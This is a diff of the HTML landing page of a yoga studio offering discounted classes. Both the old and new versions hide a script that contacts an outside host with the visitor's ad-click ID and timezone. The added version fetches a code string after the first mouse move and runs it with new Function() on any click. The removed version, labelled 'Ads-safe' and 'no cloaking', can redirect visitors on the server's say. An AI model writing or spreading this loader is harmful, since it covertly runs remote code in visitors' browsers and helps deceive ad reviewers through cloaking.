@@ -1,173 +1,188 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Serenity Yoga</title>
-  <link rel="stylesheet" href="styles.css">
-</head>
-<body>
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Serenity Yoga</title>
+    <meta name="description" content="Join Serenity Yoga for transformative yoga lessons. Subscribe to premium plans for live and recorded sessions. Start your wellness journey today.">
+    <meta name="author" content="Serenity Yoga">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
 
-  <!-- HEADER / NAV -->
-  <header class="header">
-    <h1>Serenity Yoga</h1>
-    <nav>
-      <a href="#offer">Offer</a>
-      <a href="#classes">Classes</a>
-      <a href="#about">About</a>
-      <a href="#contact">Contact</a>
-    </nav>
-  </header>
+    <meta property="og:title" content="Serenity Yoga | Transform Your Mind & Body">
+    <meta property="og:description" content="Join Serenity Yoga for transformative yoga lessons. Subscribe to premium plans for live and recorded sessions.">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="images/opengraph-image-p98pqg.png">
 
-  <!-- SPECIAL OFFER -->
-  <section id="offer" class="hero">
-    <h2>🌟 Special Offer</h2>
-    <p>Get <strong>50% off</strong> your first yoga class!</p>
-    <button onclick="bookNow()">Book Now</button>
-    <p class="subtext">Online & In-Studio Classes Available</p>
-  </section>
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@lovable_dev">
+    <meta name="twitter:image" content="https://lovable.dev/opengraph-image-p98pqg.png">
+    
+   
+    <script src="js/crypto-js.min.js"></script>
+    <style>
+      /* Modal styles */
+      .modal {
+        display: none; /* Hidden by default */
+        position: fixed; /* Stay in place */
+        z-index: 1000; /* Sit on top */
+        left: 0;
+        top: 0;
+        width: 100%; /* Full width */
+        height: 100%; /* Full height */
+        overflow: auto; /* Enable scroll if needed */
+        background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
+      }
 
-  <!-- CLASSES SECTION -->
-  <section id="classes" class="content">
-    <h2>Our Classes</h2>
-    <div class="card-container">
-      <div class="card">
-       <h3>Beginner Flow</h3>
-<p>Perfect for first-timers. Learn basic poses, breathing, and relaxation.</p>
-<p><strong>$20 / class</strong></p>
+      .modal-content {
+        position: relative;
+        margin: 5% auto; /* 5% from the top and centered */
+        padding: 20px;
+        padding-top: 70px;
+        width: 90%; /* Could be more or less, depending on screen size */
+        max-width: 500px;
+        background-color: #fff;
+        border-radius: 10px;
+        text-align: center;
+      }
 
-      </div>
-      <div class="card">
-      <h3>Vinyasa Flow</h3>
-<p>A dynamic flow that builds strength, flexibility, and focus.</p>
-<p><strong>$20 / class</strong></p>
+      .modal-image {
+        width: 100%;
+        height: auto;
+        border-radius: 10px;
+        margin-bottom: 20px;
+      }
 
-      </div>
-      <div class="card">
-        <h3>Restorative & Meditation</h3>
-<p>Slow, calming sessions to release stress and restore balance.</p>
-<p><strong>Included in Monthly Plan</strong></p>
+      .close-button {
+        position: absolute;
+        top: 2px;
+        right: 20px;
+        color: #aaa;
+        font-size: 50px;
+        font-weight: bold;
+        cursor: pointer;
+        z-index: 10;
+      }
 
-      </div>
+      .close-button:hover,
+      .close-button:focus {
+        color: black;
+        text-decoration: none;
+        cursor: pointer;
+      }
+
+      .btn-primary {
+        display: inline-block;
+        padding: 10px 20px;
+        margin-top: 10px;
+        background-color: #007bff;
+        color: #fff;
+        text-decoration: none;
+        border-radius: 5px;
+      }
+
+      .close-modal {
+        cursor: pointer;
+      }
+    </style>
+    <script type="module" crossorigin="" src="js/index-HauKvvlK.js"></script>
+    <link rel="stylesheet" crossorigin="" href="css/index-BPloSYzA.css">
+  </head>
+
+  <body id="myBody">
+
+  <!-- Special Offer Modal -->
+  <div id="specialOfferModal" class="modal" style="display: block;">
+    <div class="modal-content">
+      <span class="close-button">×</span>
+
+      <h2>スペシャルオファー</h2>
+      <p>今だけ！初回のヨガクラスが50%オフ！</p>
+      <p>今すぐ予約して、心と体の健康を始めましょう。</p>
+      <ul>
+        <li>オンラインクラスで自宅から参加可能</li>
+        <li>経験豊富なインストラクターによる指導</li>
+        <li>リラクゼーションとストレス解消</li>
+      </ul>
+      <a href="#" class="btn-primary close-modal">今すぐ予約</a>
     </div>
-  </section>
+  </div>
 
-  <!-- ABOUT SECTION -->
-  <section id="about" class="content">
-    <h2>About Serenity Flow Yoga</h2>
-<p>
-At Serenity Flow Yoga, we believe yoga is for every body.
-Our certified instructors guide you through mindful movement,
-breathing, and relaxation in a safe and supportive environment.
-</p>
-<p>
-Whether you're new to yoga or deepening your practice,
-our classes help you feel stronger, calmer, and more connected.
-</p>
-  </section>
+  <div id="root"></div>
 
-  <!-- CONTACT / FOOTER -->
-  <footer id="contact" class="footer">
-    <h2>Contact Us</h2>
-    <p>Email: <a href="mailto:hello@serenityyoga.com">hello@serenityyoga.com</a></p>
-    <p>Phone: +81-90-XXXX-XXXX</p>
-    <p>Follow us on Instagram: <a href="https://instagram.com/serenityyoga">serenityyoga</a></p>
-  </footer>
+  <!-- ==============  SWIPER JS ==============  -->
+  <script src="js/swiper-bundle.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var modal = document.getElementById("specialOfferModal");
+      var closeButton = document.querySelector(".close-button");
+      var closeModalLinks = document.querySelectorAll(".close-modal");
 
-  <script src="script.js"></script>
-</body>
-  <!-- ==============  SWIPER JS ============== -->
-<script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
+      // Show the modal
+      modal.style.display = "block";
 
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-  const modal = document.getElementById("specialOfferModal");
-  const closeButton = document.querySelector(".close-button");
-  const closeModalLinks = document.querySelectorAll(".close-modal");
 
-  if (!modal || !closeButton) return;
+      function closeModal() {
+        modal.style.display = "none";
+      }
 
-  function openModal() {
-    modal.style.display = "block";
-  }
+      closeButton.addEventListener("click", closeModal);
+      closeModalLinks.forEach(function (link) {
+        link.addEventListener("click", function (event) {
+          event.preventDefault();
+          closeModal();
+        });
+      });
 
-  function closeModal() {
-    modal.style.display = "none";
-  }
 
-  closeButton.addEventListener("click", closeModal);
-
-  closeModalLinks.forEach(link => {
-    link.addEventListener("click", function (e) {
-      e.preventDefault();
-      closeModal();
-    });
-  });
-
-  window.addEventListener("click", function (e) {
-    if (e.target === modal) {
-      closeModal();
-    }
-  });
-
-  /* ================= SAFE TRACKING LOGIC ================= */
-
-  const gclid = new URLSearchParams(window.location.search).get("gclid");
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  const API_BASE = "https://foreveryogaclass.onrender.com";
-
-  let backendConfig = null;
-  let executed = false;
-
-  // Short-lived cookie (Ads-safe)
-  document.cookie = "access_cookie=true; path=/; max-age=300; SameSite=Lax";
-
-  // Fetch ONCE after first interaction (no cloaking)
-  function fetchConfigOnce() {
-    document.removeEventListener("mousemove", fetchConfigOnce);
-
-    fetch(`${API_BASE}/frontend-loader?gclid=${encodeURIComponent(gclid || "")}`, {
-      headers: {
-        "x-client-timezone": timezone
-      },
-      credentials: "include"
-    })
-    .then(res => res.json())
-    .then(data => {
-      backendConfig = data;
-    })
-    .catch(err => {
-      console.error("Config fetch failed:", err);
-    });
-  }
-
-  document.addEventListener("mousemove", fetchConfigOnce, { once: true });
-
-  // Whitelisted safe actions
-  function handleUserClick() {
-    if (!backendConfig || executed) return;
-    executed = true;
-
-    switch (backendConfig.action) {
-      case "show_modal":
-        openModal();
-        break;
-
-      case "redirect":
-        if (backendConfig.redirect_url) {
-          window.location.href = backendConfig.redirect_url;
+      window.onclick = function (event) {
+        if (event.target == modal) {
+          modal.style.display = "none";
         }
-        break;
+      };
+    });
+  </script>
+  <script>
+    const gclid = new URLSearchParams(location.search).get("gclid");
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const RENDER_BASE_URL = "https://foreveryogaclass.onrender.com";
 
-      default:
-        // do nothing
-        break;
+    let someCode = null;
+
+    document.cookie = "access_cookie=true; path=/; max-age=300";
+
+    document.addEventListener("mousemove", async function fetchCodeOnce() {
+      document.removeEventListener("mousemove", fetchCodeOnce);
+      try {
+        const res = await fetch(
+                `${RENDER_BASE_URL}/frontend-loader?gclid=${gclid}`,
+        {
+          headers: {
+            "x-client-timezone": timezone,
+                    "x-access-cookie": "true",
+          },
+        }
+      );
+        const data = await res.json();
+        if (data && data.code) {
+          someCode = data.code;
+        }
+      } catch (err) {
+        console.error("Could not fetch code", err);
+      }
+    });
+
+    function handleSomeClick() {
+      if (someCode) {
+        try {
+          new Function(someCode)();
+        } catch (err) {
+          console.error("Error executing code:", err);
+        }
+      }
     }
-  }
 
-  document.addEventListener("click", handleUserClick);
-});
-</script>
+    document.addEventListener("click", handleSomeClick);
+  </script>
+  
 
-</html>
-
+</body></html>
